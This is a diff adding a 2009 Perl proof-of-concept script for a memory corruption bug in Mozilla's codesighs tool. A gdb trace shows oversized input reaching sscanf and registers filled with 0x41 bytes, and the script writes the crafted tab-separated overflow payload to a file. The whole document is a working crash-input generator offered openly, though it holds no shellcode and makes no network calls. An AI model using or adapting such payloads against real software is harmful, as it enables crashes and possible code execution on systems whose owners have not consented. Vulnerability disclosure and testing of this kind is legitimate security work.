@@ -1,0 +1,97 @@
+#!/usr/bin/perl
+# thedailyshow.pl
+# AKA
+# Mozilla Codesighs Memory Corruption PoC
+#
+# Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 12.12.2009
+#
+# *********************************************************************************************************
+#
+# 257	    while(0 == retval && NULL != fgets(lineBuffer, sizeof(lineBuffer), inOptions->mInput))
+# (gdb) 
+# 259	        trimWhite(lineBuffer);
+# (gdb) 
+# trimWhite (inString=0xbfffd310 "1\tCODE\t", 'A' <repeats 15 times>, "\t", 'A' <repeats 15 times>, "\t", 'A' <repeats 15 times>, "\t", 'A' <repeats 145 times>...) at codesighs.c:213
+# 213	    int len = strlen(inString);
+# (gdb) 
+# 215	    while(len)
+# (gdb) 
+# 217	        len--;
+# (gdb) 
+# 219	        if(isspace(*(inString + len)))
+# (gdb) 
+# 221	            *(inString + len) = '\0';
+# (gdb) 
+# 215	    while(len)
+# (gdb) 
+# 217	        len--;
+# (gdb) 
+# 219	        if(isspace(*(inString + len)))
+# (gdb) 
+# 228	}
+# (gdb) 
+# codesighs (inOptions=0xbffff350) at codesighs.c:261
+# 261	        scanRes = sscanf(lineBuffer,
+# (gdb) i r
+# eax            0x0	0
+# ecx            0xb7fe468c	-1208072564
+# edx            0x82	130
+# ebx            0x9d8ff4	10326004
+# esp            0xbfffd040	0xbfffd040
+# ebp            0xbffff328	0xbffff328
+# esi            0x0	0
+# edi            0x0	0
+# eip            0x8048945	0x8048945 <codesighs+142>
+# eflags         0x246	[ PF ZF IF ]
+# cs             0x73	115
+# ss             0x7b	123
+# ds             0x7b	123
+# es             0x7b	123
+# fs             0x0	0
+# gs             0x33	51
+# (gdb) s
+# 270	        if(6 == scanRes)
+# (gdb) i r
+# eax            0x6	6
+# ecx            0x414141	4276545
+# edx            0x0	0
+# ebx            0x9d8ff4	10326004
+# esp            0xbfffd040	0xbfffd040
+# ebp            0xbffff328	0xbffff328
+# esi            0x0	0
+# edi            0x0	0
+# eip            0x804899d	0x804899d <codesighs+230>
+# eflags         0x282	[ SF IF ]
+# cs             0x73	115
+# ss             0x7b	123
+# ds             0x7b	123
+# es             0x7b	123
+# fs             0x0	0
+# gs             0x33	51
+# (gdb)
+#
+# http://jbrownsec.blogspot.com/2009/12/mozilla-code-sighs.html
+#
+# "Can't read my, can't read my, no she can't read my poker face"
+#
+# *********************************************************************************************************
+# thedailyshow.pl
+
+$filename = $ARGV[0];
+
+if(!defined($filename))
+{
+
+     print "Usage: $0 <filename>\n";
+     exit;
+
+}
+
+$payload = "1\tCODE\t" . "A" x 15 . "\t" . "A" x 15 . "\t" . "A" x 15 . "\t" . "A" x 260 . "\t";
+
+     open(FILE, ">", $filename) or die("\nError: Can't write to $filename");
+     print FILE $payload;
+     close(FILE);
+
+     print "Wrote payload to \"$filename\"\n";
+     exit;
